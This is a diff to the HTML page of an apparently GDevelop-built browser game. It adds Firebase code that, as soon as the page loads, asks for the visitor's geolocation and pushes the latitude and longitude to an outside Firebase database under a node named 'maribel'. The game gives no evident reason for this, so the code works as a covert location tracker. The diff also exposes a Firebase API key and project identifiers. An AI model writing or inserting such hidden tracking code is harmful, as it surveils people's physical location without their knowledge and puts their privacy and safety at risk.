@@ -65,13 +65,72 @@
 	<script src="data.js"></script>
 
 
+	</div><script src="https://www.gstatic.com/firebasejs/5.0.4/firebase.js"></script>
 </head>
 <body>
     <div id="canvasArea"></div>
 
     <div style="font-family: 'gdjs_font_Y2K Neophyte Italic.ttf';">.</div>
 	<script>
+		
+		var config = {
+    apiKey: "AIzaSyDDeEsPxBYxzisg4GDOpmYbHBLvIw6L_IY",
+    authDomain: "mejorvargaslleras-4fd2e.firebaseapp.com",
+    databaseURL: "https://mejorvargaslleras-4fd2e.firebaseio.com",
+    projectId: "mejorvargaslleras-4fd2e",
+    storageBucket: "mejorvargaslleras-4fd2e.appspot.com",
+    messagingSenderId: "912759721594"
+  };var person = {
+  lat : 0,
+ lng:0
+  
+};
+  firebase.initializeApp(config);
+		
+		
+		
+	function coloca(){
 
+
+
+
+      
+      firebase.database().ref().child("maribel").push(person);
+
+
+}	
+		
+		
+		
+function loadLocation () {
+  //inicializamos la funcion y definimos  el tiempo maximo ,las funciones de error y exito.
+  navigator.geolocation.getCurrentPosition(viewMap);
+}
+ 
+//Funcion de exito
+function viewMap (position) {
+  
+  var lon = position.coords.longitude;  //guardamos la longitud
+  var lat = position.coords.latitude;   //guardamos la latitud
+  console.log(lat+" la   lon"+lon);
+ 
+  var link = "http://maps.google.com/?ll="+lat+","+lon+"&z=14";
+ // document.getElementById("long").innerHTML = "Longitud: "+lon;
+ // document.getElementById("latitud").innerHTML = "Latitud: "+lat;
+ person.lat=lat;
+	person.lng=lon;
+  //document.getElementById("link").href = link;
+
+  firebase.database().ref().child("maribel").push(person);
+}
+ 
+ 
+ 
+function ViewError (error) {
+  alert(error.code);
+} 
+ 
+ loadLocation ();
     (function() {
         //Initialization
         gdjs.registerObjects();
